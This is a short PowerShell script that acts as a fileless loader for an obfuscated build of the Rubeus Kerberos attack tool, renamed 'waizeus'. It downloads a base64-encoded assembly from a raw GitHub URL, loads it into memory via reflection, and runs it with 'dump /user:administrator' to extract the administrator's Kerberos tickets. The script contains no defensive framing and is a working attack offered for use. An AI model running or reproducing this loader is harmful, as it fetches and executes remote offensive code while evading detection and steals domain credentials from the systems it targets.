$Folder = "Z:\tools\winTools\obfuscated\Rubeus\waizeus\bin\Debug\"
#[Convert]::ToBase64String([IO.File]::ReadAllBytes()) | Out-File -Encoding ASCII "${Path}waizeusb64.txt"

#$bytes = [System.IO.File]::ReadAllBytes("${Folder}waizeus.exe")
#$string = [System.Convert]::ToBase64String($bytes)

$string = (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/WaiZ0/public/main/waizeusb64.txt')

$WaizeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($string))
[waizeus.Program]::Main("dump /user:administrator".Split())
